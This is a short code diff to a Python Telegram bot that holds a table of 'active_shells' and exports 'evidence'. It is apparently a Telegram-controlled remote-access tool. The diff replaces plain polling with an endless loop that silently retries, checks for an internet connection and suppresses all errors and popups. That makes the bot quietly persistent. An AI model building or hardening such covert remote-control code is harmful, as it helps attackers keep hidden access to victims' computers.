@@ -78,8 +78,8 @@ import network
 import forensics
 
 # --- BOT CONFIGURATION ---
-TOKEN = "YOUR_BOT_TOKEN_HERE"
-ADMIN_CHAT_ID = "YOUR_CHAT_ID_HERE"
+TOKEN = "Anonymous"
+ADMIN_CHAT_ID = "Anonymous"
 
 bot = telebot.TeleBot(TOKEN)
 active_shells = {}
@@ -737,5 +737,33 @@ def export_evidence(message):
     except Exception as e:
         bot.reply_to(message, f"Error: {str(e)}")
 
-print("Ultimate God-Tier Bot with Forensic Modules is running...")
-bot.polling()
+# ================================================================
+# FIXED: SILENT INFINITE POLLING WITH AUTO-RETRY (No Popups)
+# - Handles ReadTimeoutError silently
+# - Checks internet connection continuously
+# - Never crashes or shows any window/popup
+# ================================================================
+import time
+
+print("🚀 Ultimate God-Tier Bot with Forensic Modules is running silently...")
+
+while True:
+    # 1. Wait silently for internet connection
+    while True:
+        try:
+            urllib.request.urlopen('https://www.google.com', timeout=3)
+            break  # Internet is available
+        except:
+            time.sleep(5)  # Silent wait, no error messages
+
+    # 2. Run the bot with infinity polling (handles most internal errors)
+    try:
+        # infinity_polling is robust against ReadTimeoutError
+        bot.infinity_polling(timeout=60, long_polling_timeout=30)
+    except Exception:
+        # Any unexpected error: silently wait and restart the loop
+        time.sleep(5)
+        continue
+
+    # Fallback sleep if the loop breaks unexpectedly
+    time.sleep(5)
